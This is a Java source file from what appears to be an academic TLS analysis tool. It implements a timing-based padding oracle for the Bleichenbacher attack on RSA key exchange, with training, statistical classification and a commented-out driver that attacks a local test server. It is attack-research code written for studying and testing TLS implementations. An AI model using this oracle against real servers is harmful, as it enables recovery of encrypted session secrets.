/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles;

import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
import de.rub.nds.ssl.stack.workflows.commons.ESupportedSockets;
import de.rub.nds.tinytlssocket.TLSServer;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.net.SocketException;
import java.security.*;
import java.security.cert.CertificateException;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.logging.Level;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import org.apache.log4j.Logger;
import org.bouncycastle.jce.provider.BouncyCastleProvider;

/**
 *
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 * @version 0.1
 */
public class TimingOracle extends ATimingOracle {

    /**
     * Log4j logger initialization.
     */
    private static Logger logger = Logger.getRootLogger();
    private Cipher cipher;
    private TLSServer sslServer;
    /**
     * Server key store.
     */
    private static final String PATH_TO_JKS = "server.jks";
    /**
     * Pass word for server key store.
     */
    private static final String JKS_PASSWORD = "password";
    /**
     * Test Server Thread.
     */
    private Thread sslServerThread;
    /**
     * Test host.
     */
    private static final String HOST = "localhost";
    /**
     * Test port.
     */
    private static final int PORT = 10443;
    /**
     * Enable debug mode.
     */
    private static final boolean DEBUG = true;
    /**
     * Protocol short name.
     */
    private String protocolShortName = "TLS";
    /**
     * Amount of training measurementsTest
     */
    private static final int trainingAmount = 1000;
    /**
     * Amount of measurementsTest per Oracle query
     */
    private static final int measurementAmount = 200;
    private static final int measurementFactorForValidation = 1;
    /**
     * Amount of warmup measurementsTest
     */
    private static final int warmupAmount = 50;
    /**
     * Timing difference between invalid and valid timings
     */
    private static final long validInvalidBoundary = -10000000;
    private int boxLowPercentile = 5,
            boxHighPercentile = 5;
    private int counterOracle = 0;
    private int counterRequest = 0;
    ArrayList<Long> validTimings = new ArrayList<Long>(trainingAmount);
    ArrayList<Long> invalidTimings = new ArrayList<Long>(trainingAmount);
    private byte[] encInvalidPKCS;
    private byte[] encValidPKCS;
    private byte[] invalidPKCS;
    private byte[] validPKCS;
    private boolean pmsValid;

    /**
     * Constructor
     *
     * @param serverAddress
     * @param serverPort
     * @throws SocketException
     */
    public TimingOracle(final String serverAddress, final int serverPort,
            final PrivateKey privateKey, final OracleType oracleType,
            final byte[] validPlainPKCS, final byte[] invalidPlainPKCS,
            boolean containsValidPMS)
            throws SocketException, NoSuchAlgorithmException,
            InvalidKeyException, NoSuchPaddingException,
            GeneralSecurityException, IOException {
        super(serverAddress, serverPort);
        Security.addProvider(new BouncyCastleProvider());

        this.oracleType = oracleType;
        cipher = Cipher.getInstance("RSA/None/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, privateKey);

        this.publicKey = (RSAPublicKey) fetchServerPublicKey(serverAddress,
                serverPort);
        invalidPKCS = new byte[invalidPlainPKCS.length];
        System.arraycopy(invalidPlainPKCS, 0, invalidPKCS, 0,
                invalidPKCS.length);
        encInvalidPKCS = encryptHelper(invalidPlainPKCS, publicKey);

        validPKCS = new byte[validPlainPKCS.length];
        System.arraycopy(validPlainPKCS, 0, validPKCS, 0, validPKCS.length);
        encValidPKCS = encryptHelper(validPlainPKCS, publicKey);

        this.pmsValid = containsValidPMS;

    }

    private boolean isValidPKCS(byte[] testPKCS) {
        boolean result;

        counterRequest++;
        result = isValidPKCS(testPKCS, measurementAmount);

        if (result == true) {
            System.out.
                    println(
                    "Found a candidate for a valid key. Checking again with more measurements.");
            result = isValidPKCS(testPKCS,
                    measurementAmount * measurementFactorForValidation);
        }

        return result;
    }

    /**
     * This method performs the statistical analysis of the timing
     * measurementsTest. It assumes that a valid key has a significantly lower
     * response time than an invalid key. In a nutshell, the method performs
     * Crosby's box test.
     *
     * @param testKey An array containing the list of measurementsTest that were
     * performed with the key to be tested
     * @param validKey An array containing the list of measurementsTest that
     * were performed with a known-to-be-valid key
     * @return true if testKey is significantly different from invalidKey and
     * thus valid.
     */
    private boolean isValidPKCS(byte[] testPMS, int amountOfMeasurements) {

        long[] measurementsTest = new long[amountOfMeasurements];
        long[] measurementsInvalid = new long[amountOfMeasurements];

        for (int i = 0; i < amountOfMeasurements; i++) {
            try {
                executeWorkflow(testPMS, ESupportedSockets.TimingSocket);
                measurementsTest[i] = getTimeDelay(getWorkflow().getTraceList());
                executeWorkflow(encInvalidPKCS, ESupportedSockets.TimingSocket);
                measurementsInvalid[i] = getTimeDelay(getWorkflow().
                        getTraceList());
            } catch (OracleException ex) {
                java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
                        log(Level.SEVERE, null, ex);
            }
        }
        try {
            FileWriter fwInvalid = new FileWriter("invalid.csv", true);
            for (long time : measurementsInvalid) {
                fwInvalid.write(time + "\n");
            }
            fwInvalid.close();

            FileWriter fwTest = new FileWriter("test.csv", true);
            for (long time : measurementsTest) {
                fwTest.write(time + "\n");
            }
            fwTest.close();
        } catch (IOException ex) {
            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
                    log(Level.SEVERE, null, ex);
        }


        Arrays.sort(measurementsTest);
        Arrays.sort(measurementsInvalid);

        int posLow = measurementsTest.length * boxLowPercentile / 100;
        int posHigh = measurementsInvalid.length * boxHighPercentile / 100;

        /*
         * If the filtered difference between these two measurements is smaller
         * than the validInvalidBoundary, then the key is valid (--> true).
         */
        boolean result = (measurementsTest[posLow] - measurementsInvalid[posHigh]) < validInvalidBoundary;


        System.out.
                println(
                "ZZZ " + measurementsTest[posLow] + " - " + measurementsInvalid[posHigh] + " = " + (measurementsTest[posLow] - measurementsInvalid[posHigh]) + ", " + result);

        return result;
    }

    public void warmUp() throws
            OracleException {
        System.out.print("warmup... ");
        byte[] pms = new byte[48];
        System.arraycopy(validPKCS, validPKCS.length - pms.length, pms, 0,
                pms.length);
        for (int i = 0; i < warmupAmount / 2; i++) {
            // invalid case
            setEncPKCSStructure(encInvalidPKCS);
            executeWorkflow(encInvalidPKCS, ESupportedSockets.TimingSocket);

            // valid case
            if (pmsValid) {
                // if the initialized PMS is valid let's set it!
                setPlainPMS(pms);
            }
            setEncPKCSStructure(encValidPKCS);
            executeWorkflow(encValidPKCS, ESupportedSockets.TimingSocket);
            System.out.println(i + "th round");
        }
        System.out.println("done!");
    }

    @Override
    public void trainOracle(byte[] validEncPKCS, byte[] invalidEncPKCS)
            throws OracleException {

        // warmup
        System.out.print("warmup... ");
        for (int i = 0; i < warmupAmount / 2; i++) {
            setEncPKCSStructure(invalidEncPKCS);
            executeWorkflow(invalidEncPKCS, ESupportedSockets.TimingSocket);

            setEncPKCSStructure(validEncPKCS);
            executeWorkflow(validEncPKCS, ESupportedSockets.TimingSocket);
            System.out.println(i + "th round");
        }
        System.out.println("done!");

        long delay;
        // train the oracle using the executeWorkflow functionality
        for (int i = 0; i < trainingAmount; i++) {
            executeWorkflow(validEncPKCS, ESupportedSockets.TimingSocket);
            delay = getTimeDelay(getWorkflow().getTraceList());
            validTimings.add(delay);

            executeWorkflow(invalidEncPKCS, ESupportedSockets.TimingSocket);
            delay = getTimeDelay(getWorkflow().getTraceList());
            invalidTimings.add(delay);

            System.out.
                    print(
                    "\r left requests for training " + (trainingAmount - i));
        }
        System.out.println("\n");
        FileWriter fw = null;
        try {
            fw = new FileWriter("training_data.csv");

            for (int i = 0; i < trainingAmount; i++) {
                fw.write(i + ";invalid;" + invalidTimings.get(i) + "\n");
                fw.
                        write((i + trainingAmount) + ";valid;" + validTimings.
                        get(i) + "\n");
            }
            fw.close();
        } catch (IOException ex) {
            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
                    log(Level.SEVERE, null, ex);
        }
//            
//            long[] temp = new long[trainingAmount];
//            for(int i = 0; i < trainingAmount; i++) {
//                temp[i] = invalidTimings.get(i);
//            }
//            Arrays.sort(temp);
//            int pos = (trainingAmount * boxLowPercentile) / 100;
//            
//            invalidKeyLow = temp[pos];
//            
//            System.out.println("TRAINING: " + Arrays.toString(temp) + "; " + pos + "; " + invalidKeyLow);
//            
//            
//        } catch (IOException ex) {
//            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
//        }
    }

    private void plausibilityCheck() {
        try {
            for (int i = 0; i < 100; i++) {
                if (i % 2 == 0) {
                    System.out.
                            println("TRUE  : Ground truth: " + cheat(
                            encValidPKCS) + ", timing: " + isValidPKCS(
                            encValidPKCS));
                } else {
                    System.out.
                            println(
                            "FALSE : Ground truth: " + cheat(encInvalidPKCS) + ", timing: " + isValidPKCS(
                            encInvalidPKCS));
                }
            }
        } catch (IllegalBlockSizeException ex) {
            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
                    log(Level.SEVERE, null, ex);
        } catch (BadPaddingException ex) {
            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
                    log(Level.SEVERE, null, ex);
        }
    }

    private static KeyStore loadKeyStore(final InputStream keyStoreStream,
            final String keyStorePassword) throws KeyStoreException, IOException,
            NoSuchAlgorithmException, CertificateException {
        KeyStore ks = KeyStore.getInstance("JKS");
        ks.load(keyStoreStream, keyStorePassword.toCharArray());

        return ks;
    }

    private static byte[] encryptHelper(final byte[] msg,
            final PublicKey publicKey) {
        byte[] result = null;
        try {
            Cipher cipher = Cipher.getInstance("RSA/None/NoPadding");
            cipher.init(Cipher.ENCRYPT_MODE, publicKey);
            byte[] tmp = cipher.doFinal(msg);
            // deep copy
            result = new byte[tmp.length];
            System.arraycopy(tmp, 0, result, 0, result.length);
        } catch (NoSuchAlgorithmException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (IllegalBlockSizeException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (BadPaddingException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (InvalidKeyException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (NoSuchPaddingException ex) {
            logger.error(ex.getMessage(), ex);
        }

        return result;
    }

    private boolean cheat(final byte[] msg) throws IllegalBlockSizeException,
            BadPaddingException {
        boolean result;

        byte[] plainMessage = cipher.doFinal(msg);;

        StdPlainOracle plainOracle = new StdPlainOracle(publicKey,
                oracleType, cipher.getBlockSize());
        result = plainOracle.checkDecryptedBytes(plainMessage);

        return result;
    }

    @Override
    public boolean checkPKCSConformity(byte[] encPKCS) throws OracleException {
        boolean ret = false;
        boolean groundTruth = false;

        counterOracle += 1;

        try {
            groundTruth = cheat(encPKCS);

            if (counterOracle < 1890) {
                if (counterOracle % 100 == 0) {
                    System.out.print("\r" + counterOracle);
                }
                if (groundTruth == true) {
                    System.out.println(counterOracle + "TRUE!!!");
                }
                return groundTruth;
            }

            boolean test = isValidPKCS(encPKCS);

            if (groundTruth == false) {
                if (test == false) {
                    /*
                     * all good!
                     */
                    ret = test;
                } else {
                    /*
                     * The submitted key was invalid but our test predicted that the
                     * key was valid. This is the worst case, because it will most
                     * certainly break the subsequent computations. We will stop here.
                     */
                    System.err.
                            println(
                            "ERROR: invalid key was predicted to be valid. Stopping.");
                    java.util.logging.Logger.getLogger(TimingOracle.class.
                            getName()).log(Level.SEVERE,
                            "ERROR: invalid key was predicted to be valid. Stopping.");
                    // System.exit(1);
                    ret = test;
                }

            } else {
                if (test == false) {
                    /*
                     * The submitted key was valid but our test predicted that the
                     * key was invalid. This decreases the performance of the attack
                     * but does not necessarily break subsequent computations.
                     */
                    System.err.println("ERROR: valid key was predicted to be "
                            + "invalid. This decreases the attack performance.");
                    java.util.logging.Logger.getLogger(TimingOracle.class.
                            getName()).log(Level.WARNING,
                            "ERROR: valid key was predicted to be invalid. This decreases the attack performance.");
                    ret = test;
                } else {
                    /*
                     * all good!
                     */
                    ret = test;
                }
            }

        } catch (IllegalBlockSizeException ex) {
            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
                    log(Level.SEVERE, null, ex);
        } catch (BadPaddingException ex) {
            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
                    log(Level.SEVERE, null, ex);
        }

        System.out.println(counterOracle + ": Ground truth: "
                + groundTruth + ", timingoracle: " + ret);

        return ret;
    }

    public void setUp() {
        try {
            KeyStore ks = loadKeyStore(new FileInputStream("2048.jks"),
                    "password");
            System.setProperty("javax.net.debug", "ssl");

            sslServer = new TLSServer(ks, JKS_PASSWORD,
                    protocolShortName, PORT, DEBUG);
            sslServerThread = new Thread(sslServer);
            sslServerThread.start();
            Thread.currentThread().sleep(2000);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
//    public static void main(String[] args) {
//        PropertyConfigurator.configure("logging.properties");
//
//        try {
//            String keyName = "2048_rsa";
//            String keyPassword = "password";
//
//            KeyStore ks = loadKeyStore(new FileInputStream("2048.jks"),
//                    "password");
//            PublicKey publicKey = ks.getCertificate(keyName).getPublicKey();
//            PrivateKey privateKey = (PrivateKey) ks.getKey(keyName, keyPassword.
//                    toCharArray());
//
//            TimingOracle to = new TimingOracle(HOST, PORT,
//                    privateKey, OracleType.TTT);
//            // TODO: Start SSL-Server for testing purposes
//            to.setUp();
//
//            // a PMS is exactly 48 bytes long!
//            byte[] rawPMS = new byte[48];
//            System.arraycopy(plainPKCS, plainPKCS.length - 48, rawPMS, 0,
//                    rawPMS.length);
//            // it is necessary to set the plain PMS for a complete handshake
//            to.setPlainPMS(new PreMasterSecret(rawPMS));
//
//            byte[] plainPKCS_wrong = new byte[plainPKCS.length];
//            System.arraycopy(plainPKCS, 0, plainPKCS_wrong, 0, plainPKCS.length);
//            plainPKCS_wrong[0] = 23;
//
//            to.encPMS = encryptHelper(plainPKCS, publicKey);
//            to.encInvalidPKCS = encryptHelper(plainPKCS_wrong, publicKey);
//
//            to.trainOracle(to.encPMS, to.encInvalidPKCS);
//            to.plausibilityCheck();
//
//            Bleichenbacher attacker = new Bleichenbacher(to.encPMS, to, true);
//            attacker.attack();
//        } catch (UnrecoverableKeyException ex) {
//            logger.error(ex.getMessage(), ex);
//        } catch (KeyStoreException ex) {
//            logger.error(ex.getMessage(), ex);
//        } catch (NoSuchAlgorithmException ex) {
//            logger.error(ex.getMessage(), ex);
//        } catch (CertificateException ex) {
//            logger.error(ex.getMessage(), ex);
//        } catch (IOException ex) {
//            logger.error(ex.getMessage(), ex);
//        } catch (OracleException ex) {
//            logger.error(ex.getMessage(), ex);
//        }
//    }
}